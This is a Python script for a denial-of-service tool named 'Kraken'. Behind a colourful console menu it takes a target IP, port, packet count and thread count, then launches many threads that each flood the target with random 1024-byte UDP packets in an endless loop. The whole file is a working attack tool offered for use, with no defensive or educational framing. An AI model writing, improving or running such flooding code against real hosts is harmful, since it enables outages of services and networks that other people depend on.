import socket
import random
import threading
import os
from colorama import *
import string
import time
def go():
   while True:
    global port
    global perconn
    global ip
    try:
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(1024)
     addr = (str(ip),int(port))
     for i in range(perconn):
       s.sendto(data,addr)
    except:
     pass

def program():
  print(Fore.LIGHTWHITE_EX + """
                 █  █▀ █▄▄▄▄ ██ • █  █▀ ▄███▄   •  ▄   """, end="")
  print(Fore.LIGHTCYAN_EX + """
                 █▄█ • █  ▄▀ █ █  █▄█   █▀   ▀      █  """, end="")
  print(Fore.LIGHTCYAN_EX + """
                 █▀▄   █▀▀▌  █▄▄█ █▀▄ • ██▄▄  • ██   █ """, end="")
  print(Fore.LIGHTCYAN_EX + """
                 █  █  █  █  █  █ █  █  █▄   ▄▀ █ █  █ """, end="")
  print(Fore.LIGHTCYAN_EX + """
                   █     █   •  █   █   ▀███▀   █  █ █ """, end="")
  print(Fore.LIGHTCYAN_EX + """
                  ▀ •   ▀      █   ▀       •    █   ██ 
                              ▀ """)
  print(Fore.LIGHTCYAN_EX + """                      ╚╬╝                      ╚╬╝
              ╔════════╩════════════════════════╩════════╗""")
  print("              ║", end="") 
  print(Fore.LIGHTWHITE_EX + ' SET IP: ', end="")
  print(Fore.LIGHTCYAN_EX + 'kraken.setip ', end="")
  print(Fore.LIGHTWHITE_EX + '<ip> ', end="")               
  print(Fore.LIGHTCYAN_EX + "               ║")
  print("              ║", end="") 
  print(Fore.LIGHTWHITE_EX + ' SET PORT: ', end="")
  print(Fore.LIGHTCYAN_EX + 'kraken.setport ', end="") 
  print(Fore.LIGHTWHITE_EX + '<port> ', end="")   
  print(Fore.LIGHTCYAN_EX + '         ║')
  print('              ║', end="")
  print(Fore.LIGHTWHITE_EX + ' SET PERCONN: ', end="")
  print(Fore.LIGHTCYAN_EX + 'kraken.setperconn ', end="")
  print(Fore.LIGHTWHITE_EX + '<perconn>', end="")
  print(Fore.LIGHTCYAN_EX + ' ║')
  print("              ║", end="")
  print(Fore.LIGHTWHITE_EX + ' SET THREADS: ', end="")
  print(Fore.LIGHTCYAN_EX + 'kraken.setthreads ', end="")
  print(Fore.LIGHTWHITE_EX + '<threads> ', end="")
  print(Fore.LIGHTCYAN_EX + "║")
  print("              ║", end="")
  print(Fore.LIGHTWHITE_EX + " ATTACK: ", end="") 
  print(Fore.LIGHTCYAN_EX + "kraken.attack", end="")      
  print(Fore.LIGHTCYAN_EX + '                    ║')
  print("              ╚══════════════════════════════════════════╝")
  print('')
  print(Fore.LIGHTCYAN_EX + "╔", end="")
  print(Fore.LIGHTWHITE_EX + "-[root", end="")
  print(Fore.LIGHTCYAN_EX + "@", end="")
  print(Fore.LIGHTWHITE_EX + "kraken]")
  print(Fore.LIGHTCYAN_EX + "╚══════════════", end="")
  global command
  command = input(Fore.LIGHTWHITE_EX + "➤ ")
  if "kraken.setport " in command:
    setport=command.replace("kraken.setport ","")
    global port
    port = setport
    print(Fore.LIGHTCYAN_EX + " «", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + "«", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + ' Set port to: ', end="")
    print(Fore.LIGHTWHITE_EX + '%s ' % port, end="")
    ndsjskns = input('')
    os.system('cls')
    program()
  if "kraken.setperconn " in command:
    setperconn=command.replace("kraken.setperconn ","")
    global perconn
    a = int(setperconn)
    perconn = a
    print(Fore.LIGHTCYAN_EX + " «", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + "«", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + ' Set perconn to: ', end="")
    print(Fore.LIGHTWHITE_EX + '%s ' % perconn, end="")
    ndsjsknsns = input('')
    os.system('cls')
    program()
  if "kraken.setthreads " in command:
    setthreads=command.replace("kraken.setthreads ","")
    a = int(setthreads)
    global COUNT
    COUNT = a
    print(Fore.LIGHTCYAN_EX + " «", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + "«", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + ' Set threads to: ', end="")
    print(Fore.LIGHTWHITE_EX + '%s ' % COUNT, end="")
    ndsjsknsnsis = input('')
    os.system('cls')
    program()
  if "kraken.setip " in command:
	  setip()
  if "kraken.attack" in command:
    print(Fore.LIGHTCYAN_EX + " «", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + "«", end="")
    print(Fore.LIGHTWHITE_EX + "«", end="")
    print(Fore.LIGHTCYAN_EX + " RELEASE THE KRAKEN!!!")
    time.sleep(0.3)
    threads()
  else:
    os.system('cls')
    program()
def threads():
 global COUNT
 for i in range(COUNT):
   try:
     t = threading.Thread(target=go)
     t.start()
   except Exception as e:
     print(f"An error ocurred initializing thread {i}: {e}")
def setip():
  global command
  setip = command.replace("kraken.setip ","")
  global ip
  ip = setip
  print(Fore.LIGHTCYAN_EX + " «", end="")
  print(Fore.LIGHTWHITE_EX + "«", end="")
  print(Fore.LIGHTCYAN_EX + "«", end="")
  print(Fore.LIGHTWHITE_EX + "«", end="")
  print(Fore.LIGHTCYAN_EX + ' Set IP to: ', end="")
  print(Fore.LIGHTWHITE_EX + '%s ' % ip, end="")
  ndsjsknsnsis = input('')
  os.system('cls')
  program()
program()
